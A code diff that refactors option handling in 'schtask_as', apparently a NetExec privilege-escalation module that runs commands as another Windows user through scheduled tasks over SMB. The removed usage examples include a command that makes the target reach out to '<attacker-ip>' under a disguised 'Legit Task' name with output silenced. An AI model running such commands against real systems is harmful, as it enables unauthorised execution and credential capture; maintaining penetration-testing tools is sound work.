@@ -17,49 +17,20 @@ class NXCModule:
     supported_protocols = ["smb"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
-    def options(self, context, module_options):
-        r"""
-        CMD            Command to execute
-        USER           User to execute command as
-        BINARY         OPTIONAL: Upload the binary to be executed by CMD
-        TASK           OPTIONAL: Set a name for the scheduled task name
-        FILE           OPTIONAL: Set a name for the command output file
-        LOCATION       OPTIONAL: Set a location for the command output file (e.g. 'C:\\Windows\\Temp\\')
-        SILENTCOMMAND  OPTIONAL: Do not retrieve output
+    def __init__(self, context=None, module_options=None):
+        self.context = context
+        self.module_options = module_options
 
-        Example:
-        -------
-        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
-        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
-        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\<attacker-ip>\pwn' TASK='Legit Task' SILENTCOMMAND='True'
-        """
-        self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = None
-        self.share = "C$"
-        self.tmp_dir = "C:\\Windows\\Temp\\"
-        self.tmp_path = self.tmp_dir.split(":")[1]
-        self.show_output = True
-
-        if "CMD" in module_options:
-            self.command_to_run = module_options["CMD"]
-
-        if "BINARY" in module_options:
-            self.binary_to_upload = module_options["BINARY"]
-
-        if "USER" in module_options:
-            self.run_task_as = module_options["USER"]
-
-        if "TASK" in module_options:
-            self.task_name = module_options["TASK"]
-
-        if "FILE" in module_options:
-            self.output_filename = module_options["FILE"]
-
-        if "LOCATION" in module_options:
-            # Ensure trailing backslashes
-            self.output_file_location = module_options["LOCATION"].rstrip("\\") + "\\"
-
-        if "SILENTCOMMAND" in module_options and module_options["SILENTCOMMAND"] in ["True", "yes", "1"]:
-            self.show_output = False
+    def register_module_options(self, subparsers):
+        subparsers.add_argument("--useras", required=True, help="User to execute command as")
+        subparsers.add_argument("--cmd", required=True, help="Command to execute")
+        subparsers.add_argument("--binary", help="Upload a binary to execute")
+        subparsers.add_argument("--task", help="Name for the scheduled task")
+        subparsers.add_argument("--file", help="Name for the output file")
+        subparsers.add_argument("--location", help="Location for the output file")
+        subparsers.add_argument("--silentcommand", action="store_true", help="Execute without retrieving output")
+        subparsers.set_defaults(module="schtask_as")
+        return subparsers
 
     def on_admin_login(self, context, connection):
         self.logger = context.log
